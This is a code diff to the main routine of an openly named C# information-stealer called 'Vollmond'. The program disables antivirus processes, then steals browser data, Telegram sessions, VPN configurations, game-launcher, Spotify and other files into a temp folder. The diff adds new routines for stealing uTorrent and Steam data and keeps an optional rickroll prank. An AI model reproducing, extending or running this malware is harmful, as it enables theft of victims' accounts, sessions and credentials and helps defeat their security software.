@@ -1,4 +1,3 @@
-using System.Diagnostics;
 using System.IO.Compression;
 using Vollmond.Browsers;
 using Vollmond.messengers;
@@ -6,6 +5,7 @@ using Vollmond.Minecraft;
 using Vollmond.Security_Bypass;
 using Vollmond.Streaming_platforms;
 using Vollmond.VPN;
+using Vollmond.games;
 
 namespace Vollmond
 {
@@ -18,7 +18,8 @@ namespace Vollmond
         [STAThread]
         static void Main()
         {
-            try {
+            try
+            {
                 Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data"));
 
                 KillAllAntiviruses.KillAntiviruses(); // Killing antiviruses processes while stealer working
@@ -26,10 +27,13 @@ namespace Vollmond
                 // Stealing data
                 StealAllBrowsers.stealAllBrowsers();
                 StealTelegram.StealSession();
+                UTorrent.StealCurrentTorrents();
                 GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                 ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                 Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
-                Spotify.Steal(); // Makes a directory "Spotify" (Nota bene)
+                Spotify.Steal();
+                Steam.Steal(); // Makes a directory "games" (Nota bene)
+
 
                 // Time to complete processes
                 Thread.Sleep(2000);
@@ -57,7 +61,7 @@ namespace Vollmond
 
                 if (URLs.is_need_rickroll == true)
                 {
-                    Auxiliary_payload.play_rick.Start();
+                    Auxiliary.play_rick.Start();
                     MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
                         MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                 }
